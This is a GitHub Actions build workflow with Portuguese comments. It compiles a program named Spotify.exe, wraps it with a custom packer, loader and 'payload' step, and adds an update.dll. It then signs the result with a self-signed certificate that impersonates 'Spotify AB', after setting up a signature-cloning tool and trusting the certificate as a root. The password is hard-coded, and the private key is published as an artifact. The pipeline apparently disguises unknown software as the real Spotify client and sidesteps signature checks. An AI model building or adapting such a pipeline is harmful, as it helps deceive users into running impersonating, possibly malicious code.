name: Build Spotify - Costura + Protector
on:
  push:
    branches: [ main, master, develop ]
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: üßæ Checkout c√≥digo
        uses: actions/checkout@v4

      - name: ‚öôÔ∏è Configurar .NET
        uses: actions/setup-dotnet@v3
        with:
          dotnet-version: '6.0.x'

      - name: ‚öôÔ∏è Configurar Visual Studio
        uses: microsoft/setup-msbuild@v1.3

      - name: üì¶ Instalar NuGet CLI
        run: choco install nuget.commandline -y

      - name: üîß Configurar FodyWeavers.xml
        shell: pwsh
        run: |
          Write-Host "üîß Criando FodyWeavers.xml..."
        
          $xml = '<?xml version="1.0" encoding="utf-8"?>'
          $xml += '<Weavers xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="FodyWeavers.xsd">'
          $xml += '  <Costura />'
          $xml += '</Weavers>'
        
          $xml | Out-File -FilePath "FodyWeavers.xml" -Encoding UTF8 -Force
          Write-Host "‚úÖ FodyWeavers.xml configurado!"

      - name: üóëÔ∏è Limpar bin/obj
        shell: pwsh
        run: |
          @("bin", "obj") | ForEach-Object {
            if (Test-Path $_) { Remove-Item -Recurse -Force $_ -ErrorAction SilentlyContinue }
          }

      - name: üîÑ Restaurar depend√™ncias solu√ß√£o
        shell: pwsh
        run: |
          nuget restore Spotify.sln -Verbosity detailed
          if ($LASTEXITCODE -ne 0) { exit 1 }

      - name: üî® Compilar Release com Costura
        shell: pwsh
        run: |
          msbuild Spotify.sln /p:Configuration=Release /p:Platform="Any CPU" /t:Rebuild /verbosity:minimal /p:UseSharedCompilation=false
          if ($LASTEXITCODE -ne 0) { exit 1 }
          if (!(Test-Path "bin\Release\Spotify.exe")) { Write-Host "‚ùå Execut√°vel n√£o gerado"; exit 1 }

      - name: üîß Compilar Update DLL (update.dll)
        shell: pwsh
        run: |
          if (!(Test-Path "Update\Update.csproj")) { Write-Host "‚ùå Update.csproj n√£o encontrado"; exit 1 }
          msbuild Update\Update.csproj /p:Configuration=Release /m
          if ($LASTEXITCODE -ne 0) { exit 1 }
          $dll = (Get-ChildItem "Update\bin\Release" -Recurse -Filter update.dll | Select-Object -First 1).FullName
          if (!$dll) { Write-Host "‚ùå update.dll n√£o encontrado ap√≥s build"; exit 1 }
          if (!(Test-Path "bin\Release")) { New-Item -ItemType Directory -Path "bin\Release" | Out-Null }
          Copy-Item $dll "bin\Release\update.dll" -Force

      - name: üõ°Ô∏è Compilar Protector (Mono.Cecil)
        shell: pwsh
        run: |
          if (!(Test-Path "Protector\Protector.csproj")) { Write-Host "‚ùå Projeto Protector n√£o encontrado"; exit 1 }
          dotnet restore Protector\Protector.csproj
          dotnet build Protector\Protector.csproj -c Release -v minimal
          if ($LASTEXITCODE -ne 0) { exit 1 }

      - name: üõ°Ô∏è Compilar Loader (Protector.Loader)
        shell: pwsh
        run: |
          if (!(Test-Path "Protector.Loader\Protector.Loader.csproj")) { Write-Host "‚ùå Projeto Loader n√£o encontrado"; exit 1 }
          dotnet restore Protector.Loader\Protector.Loader.csproj
          dotnet build Protector.Loader\Protector.Loader.csproj -c Release -v minimal
          if ($LASTEXITCODE -ne 0) { exit 1 }
          $global:loaderPath = (Get-ChildItem "Protector.Loader\bin\Release" -Recurse -Filter Protector.Loader.exe | Select-Object -First 1).FullName
          if (!$global:loaderPath) { Write-Host "‚ùå Loader compilado n√£o encontrado"; exit 1 }

      - name: üõ°Ô∏è Aplicar Protector (empacotar Loader + payload)
        shell: pwsh
        run: |
          $protExe = (Get-ChildItem "Protector\bin\Release" -Recurse -Filter Protector.exe | Select-Object -First 1).FullName
          if (!$protExe) { Write-Host "‚ùå Protector.exe n√£o encontrado"; exit 1 }
          $input = "bin\Release\Spotify.exe"
          $outDir = "bin\Protected"
          if (!(Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }
          $output = "$outDir\Spotify.exe"
          $loader = (Get-ChildItem "Protector.Loader\bin\Release" -Recurse -Filter Protector.Loader.exe | Select-Object -First 1).FullName
          if (!$loader) { Write-Host "‚ùå Loader n√£o encontrado"; exit 1 }
          & $protExe $input $output $loader
          if ($LASTEXITCODE -ne 0) { Write-Host "‚ùå Falha ao proteger"; exit 1 }

      - name: üîç Verificar resultado protegido
        shell: pwsh
        run: |
          $protected = "bin\Protected\Spotify.exe"
          if (!(Test-Path $protected)) { Write-Host "‚ùå Arquivo protegido n√£o gerado"; exit 1 }
          $orig = (Get-Item "bin\Release\Spotify.exe").Length
          $prot = (Get-Item $protected).Length
          Write-Host "üìä Original: $([math]::Round($orig/1MB,2)) MB"
          Write-Host "üõ°Ô∏è Protegido: $([math]::Round($prot/1MB,2)) MB"

      - name: üêç Configurar Python e SignatureClone
        shell: pwsh
        run: |
          Write-Host "üêç Configurando Python e SignatureClone..."
          
          # Instalar Python se necess√°rio
          if (!(Get-Command python -ErrorAction SilentlyContinue)) {
            choco install python -y
            $env:Path += ";C:\Python*\Scripts;C:\Python*"
          }
          
          # Instalar depend√™ncias do SignatureClone
          pip install pefile cryptography
          
          # Verificar se SignatureClone est√° dispon√≠vel
          if (!(Test-Path "SignatureClone-main\SignatureClone.py")) {
            Write-Host "‚ùå SignatureClone n√£o encontrado"
            exit 1
          }
          
          Write-Host "‚úÖ Python e depend√™ncias configuradas"

      - name: üîê Criar certificado autoassinado
        shell: pwsh
        run: |
          Write-Host "üîê Criando certificado autoassinado para assinatura v√°lida..."
          
          # Criar certificado autoassinado
          $certParams = @{
            Subject = "CN=Spotify AB, O=Spotify AB, L=Stockholm, C=SE"
            Type = "CodeSigningCert"
            CertStoreLocation = "Cert:\CurrentUser\My"
            KeyExportPolicy = "Exportable"
            KeySpec = "Signature"
            KeyLength = 2048
            KeyAlgorithm = "RSA"
            HashAlgorithm = "SHA256"
            NotAfter = (Get-Date).AddYears(10)
          }
          
          $cert = New-SelfSignedCertificate @certParams
          Write-Host "‚úÖ Certificado criado: $($cert.Thumbprint)"
          
          # Exportar certificado para arquivo PFX (com senha)
          $pwd = ConvertTo-SecureString -String "SpotifySignature2024" -Force -AsPlainText
          $pfxPath = "SpotifyCodeSign.pfx"
          Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $pwd
          Write-Host "‚úÖ Certificado exportado: $pfxPath"
          
          # Exportar certificado p√∫blico para instala√ß√£o
          $cerPath = "SpotifyCodeSign.cer"
          Export-Certificate -Cert $cert -FilePath $cerPath
          Write-Host "‚úÖ Certificado p√∫blico exportado: $cerPath"
          
          # Instalar certificado na Trusted Root (para assinatura v√°lida localmente)
          $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root","LocalMachine")
          $store.Open("ReadWrite")
          $store.Add($cert)
          $store.Close()
          Write-Host "‚úÖ Certificado instalado em Trusted Root"

      - name: üîè Assinar execut√°vel com signtool.exe
        shell: pwsh
        run: |
          Write-Host "üîè Assinando execut√°vel com signtool.exe..."
          
          # Localizar signtool.exe no Windows SDK
          $signtoolPaths = @(
            "${env:ProgramFiles(x86)}\Windows Kits\10\bin\*\x64\signtool.exe",
            "${env:ProgramFiles}\Windows Kits\10\bin\*\x64\signtool.exe",
            "${env:ProgramFiles(x86)}\Windows Kits\10\App Certification Kit\signtool.exe",
            "${env:ProgramFiles}\Windows Kits\10\App Certification Kit\signtool.exe"
          )
          
          $signtool = $null
          foreach ($path in $signtoolPaths) {
            $found = Get-ChildItem $path -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($found) {
              $signtool = $found.FullName
              break
            }
          }
          
          if (!$signtool) {
            Write-Host "‚ö†Ô∏è signtool.exe n√£o encontrado, instalando Windows SDK..."
            choco install windows-sdk-10.1 -y
            
            # Tentar localizar novamente
            foreach ($path in $signtoolPaths) {
              $found = Get-ChildItem $path -ErrorAction SilentlyContinue | Select-Object -First 1
              if ($found) {
                $signtool = $found.FullName
                break
              }
            }
            
            if (!$signtool) {
              Write-Host "‚ùå signtool.exe ainda n√£o encontrado ap√≥s instala√ß√£o"
              exit 1
            }
          }
          
          Write-Host "‚úÖ signtool.exe encontrado: $signtool"
          
          # Assinar o execut√°vel protegido
          $targetFile = "bin\Protected\Spotify.exe"
          $pfxPath = "SpotifyCodeSign.pfx"
          $pwd = "SpotifySignature2024"
          
          if (!(Test-Path $targetFile)) {
            Write-Host "‚ùå Arquivo alvo n√£o encontrado: $targetFile"
            exit 1
          }
          
          # Comando de assinatura
          $signCmd = @(
            "sign",
            "/f", "`"$pfxPath`"",
            "/p", "`"$pwd`"",
            "/t", "http://timestamp.digicert.com",
            "/fd", "SHA256",
            "/v",
            "`"$targetFile`""
          )
          
          Write-Host "üìù Executando assinatura..."
          & $signtool @signCmd
          
          if ($LASTEXITCODE -eq 0) {
            Write-Host "‚úÖ Execut√°vel assinado com sucesso!"
            
            # Verificar assinatura
            $cert = Get-AuthenticodeSignature $targetFile
            Write-Host "üîç Status da assinatura: $($cert.Status)"
            Write-Host "üîç Certificado: $($cert.SignerCertificate.Subject)"
            
            # Renomear para Spotify_Signed.exe
            $signedFile = "bin\Protected\Spotify_Signed.exe"
            Copy-Item $targetFile $signedFile -Force
            Write-Host "‚úÖ Arquivo assinado copiado para: $signedFile"
            
            $finalSize = (Get-Item $signedFile).Length
            Write-Host "üìä Tamanho final: $([math]::Round($finalSize/1MB,2)) MB"
          } else {
            Write-Host "‚ùå Falha ao assinar execut√°vel"
            exit 1
          }

      - name: üß™ Teste de execu√ß√£o
        shell: pwsh
        run: |
          function Test-Exe { param([string]$Path,[string]$Label)
            Write-Host "üìã $Label"
            $testDir = "test_$([guid]::NewGuid().ToString('N').Substring(0,8))"
            try {
              New-Item -ItemType Directory -Path $testDir | Out-Null
              Copy-Item $Path "$testDir\Spotify.exe"
              $p = Start-Process -FilePath "$testDir\Spotify.exe" -PassThru -WindowStyle Hidden -ErrorAction Stop
              Start-Sleep -Seconds 2
              if ($p -and !$p.HasExited) { Write-Host "‚úÖ OK (PID $($p.Id))"; $p.Kill(); return $true } else { return $false }
            } catch { Write-Host "‚ùå Erro: $($_.Exception.Message)"; return $false } finally { if (Test-Path $testDir) { Remove-Item -Recurse -Force $testDir -ErrorAction SilentlyContinue } }
          }
          
          function Test-Certificate { param([string]$Path)
            try {
              $cert = Get-AuthenticodeSignature $Path
              if ($cert.Status -eq "Valid") {
                Write-Host "‚úÖ Certificado v√°lido: $($cert.SignerCertificate.Subject)"
                return $true
              } elseif ($cert.Status -eq "NotSigned") {
                Write-Host "‚ö†Ô∏è Arquivo n√£o assinado"
                return $false
              } else {
                Write-Host "‚ö†Ô∏è Certificado presente mas inv√°lido: $($cert.Status)"
                return $true  # Certificado presente mas inv√°lido (esperado com clone)
              }
            } catch {
              Write-Host "‚ùå Erro ao verificar certificado: $($_.Exception.Message)"
              return $false
            }
          }
          
          $ok1 = Test-Exe "bin\Release\Spotify.exe" "RELEASE"
          $ok2 = Test-Exe "bin\Protected\Spotify.exe" "PROTEGIDO"
          $ok3 = Test-Exe "bin\Protected\Spotify_Signed.exe" "PROTEGIDO COM CERTIFICADO"
          
          # Verificar certificado no arquivo final
          if (Test-Path "bin\Protected\Spotify_Signed.exe") {
            Test-Certificate "bin\Protected\Spotify_Signed.exe"
          }
          
          if (-not $ok1 -or -not $ok2 -or -not $ok3) { exit 1 }

      - name: üìÅ Upload Arquivos Finais
        uses: actions/upload-artifact@v4
        with:
          name: spotify-final
          path: |
            bin/Protected/Spotify_Signed.exe
            bin/Release/update.dll
            SpotifyCodeSign.cer
            SpotifyCodeSign.pfx
          retention-days: 90
        if: always()
